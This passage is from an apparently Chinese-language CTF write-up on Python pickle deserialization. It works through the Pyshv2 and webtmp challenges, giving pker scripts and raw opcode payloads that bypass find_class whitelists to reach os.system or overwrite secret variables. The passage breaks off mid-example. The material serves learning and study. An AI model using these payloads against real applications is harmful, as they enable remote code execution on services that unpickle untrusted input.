&lt;p>审计一下源码，先看一下肯定会不secure的securePickle.oy&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811212055295.png" alt="image-20210811212055295">&lt;/p>
&lt;p>重写&lt;code>find_class()&lt;/code>，被调用时可以灵活添加白名单；再看看server.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811211736904.png" alt="image-20210811211736904">&lt;/p>
&lt;p>将输入的内容先转为ascii码形式被b64加密，再反序列化出来；其中白名单是sys模块&lt;/p>
&lt;p>但是这个sys模块并不安全：sys模块有一个字典对象sys.modules，它包含了运行时所有py程序所引入的所有模块(a cache of imported modules) ，如果它被改变 引入的模块就会被改变。而它也包括sys本身，也就是套娃&lt;code>sys.modules['sys']=sys.modules&lt;/code>。那么如果我们先从sys中引入modules: &lt;code>import modules from sys&lt;/code>，然后将&lt;code>modules['sys']&lt;/code>改为&lt;code>modules['os']&lt;/code>就将成功引入os模块。&lt;/p>
&lt;p>但有个缺陷是modules为dict，需要用&lt;code>getattr(sys.modules[module], name)&lt;/code>进行取值，也就是先取出modules中的get函数，然后再用get来取出os，再进行替换修改&lt;/p>
&lt;p>pker&lt;/p>
&lt;pre tabindex="0">&lt;code>modules=GLOBAL('sys', 'modules')
modules['sys']=modules
modules_get=GLOBAL('sys', 'get')
os=modules_get('os')
modules['sys']=os
system=GLOBAL('sys', 'system')
system('dir')
return
&lt;/code>&lt;/pre>&lt;p>opcode:&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;csys\nmodules\np0\n0g0\nS'sys'\ng0\nscsys\nget\np2\n0g2\n(S'os'\ntRp3\n0g0\nS'sys'\ng3\nscsys\nsystem\np5\n0g5\n(S'dir'\ntR.&amp;quot;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811215300764.png" alt="image-20210811215300764">&lt;/p>
&lt;/details>
&lt;h3 id="--仅可以引入题目中自设空模块">&amp;ndash;&amp;raquo;仅可以引入题目中自设空模块&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子6 - [BalsnCTF 2019] Pyshv2
&lt;/h4>
&lt;/summary>
&lt;p>题目环境-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2&lt;/p>
&lt;p>&lt;code>find_class()&lt;/code>稍有区别，在&lt;code>getattr()&lt;/code>之前先用了&lt;code>__import__()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220348086.png" alt="image-20210811220348086">&lt;/p>
&lt;p>这次的白名单是&lt;code>structs&lt;/code>，然鹅这是个空的模块 虚晃一枪。不过是空的不要紧，照样有内置方法。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220801646.png" alt="image-20210811220801646">&lt;/p>
&lt;p>&lt;code>__builtins__&lt;/code>是所有模块公有的字典，记录所有的内建函数，可以通过对&lt;code>__builtins__&lt;/code>内相应的键来修改对应的函数，上图中我们找到了eval方法，但取出eval这个键另外需要一个get方法才能做到。&lt;/p>
&lt;p>我们知道，&lt;code>__getattribute__&lt;/code>魔术方法可以访问任意属性。而同时&lt;code>__import__&lt;/code>并不是铁板一块，它的全部参数是&lt;code>__import__(name, globals=None, locals=None, fromlist=(), level=0)&lt;/code>，它可以被替换（通过导入builtins模块并赋值给&lt;code>builtins.__import__&lt;/code>）来可以修改import语句的语义并且不会导致代码问题，而题目中重写的find_class()特地在getattr()之前调用了&lt;code>__import__&lt;/code>，现在我们可以劫持这个__import__，让它变为&lt;code>__getattribute__&lt;/code>，让我们引入的structs变为&lt;code>structs.__getattribute__(structs).xxx&lt;/code>。&lt;/p>
&lt;p>对于引入模块的检查只会出现在b&amp;rsquo;c&amp;rsquo;时，所以我们在用&lt;code>S&lt;/code>操作码劫持&lt;code>__import__&lt;/code>时并不会引发find_class()的过滤。&lt;/p>
&lt;p>然而我们不能直接getattr()=getattr()这样覆盖&lt;code>__import__&lt;/code>，我们还需要&lt;code>__dict__&lt;/code>的帮忙。&lt;code>__dict__&lt;/code>是一个列表，存储并决定了一个对象的所有属性，如果它的内容被改变，属性也会跟着改变。&lt;/p>
&lt;p>所以整合一下上面的思路：我们先要引入助手list&lt;code>structs.__dict__&lt;/code>，取出structs空模块的内建函数（一个待取的dict）&lt;code>structs.__builtins__&lt;/code>和我们需要的魔术方法&lt;code>structs.__getattribute__&lt;/code>。之后从内建函数&lt;code>structs.__builtins__&lt;/code>中将键名为&lt;code>__import__&lt;/code>的值替换为&lt;code>structs.__getattribute__&lt;/code>，然后借助&lt;code>__dict__&lt;/code>将structs的structs属性覆盖为修改后的内建函数。这时，我们再次用b&amp;rsquo;c&amp;rsquo;从structs中引入get时触发find_class()中的&lt;code>__import__&lt;/code>，也就相当于在执行&lt;code>structs.__getattribute__('structs').get&lt;/code>，这样我们就拿到了get方法。而之前我们又已经替换了structs属性为内建函数&lt;code>__builtins__&lt;/code>，所以利用这个得到的get方法就可以从&lt;code>__builtins__&lt;/code>中取出eval，执行代码了。之后执行代码的部分同上面的sys.modules的思路。&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">__dict__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__dict__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">gtat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__getattribute__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">gtat&lt;/span>
&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">__builtins__&lt;/span>
&lt;span style="color:#111">builtin_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">builtin_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.sys.modules[&amp;#39;&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#d88200">&amp;#39;].system(&amp;#39;&lt;/span>&lt;span style="color:#111">cat&lt;/span> &lt;span style="color:#f92672">../&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR.&amp;quot;
&lt;/code>&lt;/pre>&lt;/details>
&lt;h3 id="禁止br操作码">禁止&lt;code>b'R'&lt;/code>操作码&lt;/h3>
&lt;p>也就相当于不可以用&lt;code>__reduce__&lt;/code>，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用&lt;code>b'i'&lt;/code>，&lt;code>b'i'&lt;/code>，&lt;code>b'b'&lt;/code>这些操作码来rce。&lt;/p>
&lt;h3 id="--变量覆盖">&amp;ndash;&amp;raquo;变量覆盖&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子7 - [高校战“疫”网络安全分享赛2020] webtmp
&lt;/h4>
&lt;/summary>
&lt;p>（这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了&lt;code>R&lt;/code>操作码，同时重写&lt;code>find_class()&lt;/code>限制引入模块为&lt;code>__main__&lt;/code>，两个考点）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">secret&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;source&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">mimetype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;text/plain&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;No... I don&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t like R-things. No Rabits, Rats, Roosters or RCEs.&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Are you sure that is an animal???&amp;#39;&lt;/span>
&lt;span style="color:#111">correct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_result.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">giveflag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">correct&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">repr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Something wrong&amp;#34;&lt;/span>
&lt;span style="color:#111">sample_obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;一给我哩giaogiao&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Giao&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_page.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>看源码，opcode部分ban掉了&lt;code>R&lt;/code>操作码（调用一个callable对象），不能用&lt;code>__reduce__&lt;/code>了；也重写了&lt;code>find_class()&lt;/code>，module必须是&lt;code>__main__&lt;/code>；我们的目标是&lt;/p>
&lt;p>&lt;code>restricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)&lt;/code>为真，即correct==True&lt;/p>
&lt;p>这里我们通过加载&lt;code>__main__.secret&lt;/code>可以引入secret模块，来把&lt;code>secret.name&lt;/code>和&lt;code>secret.category&lt;/code>这两个变量覆盖为任意字符串，再以这个字符串为参数构造Animal对象（栈顶对于type的检查）&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">secret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
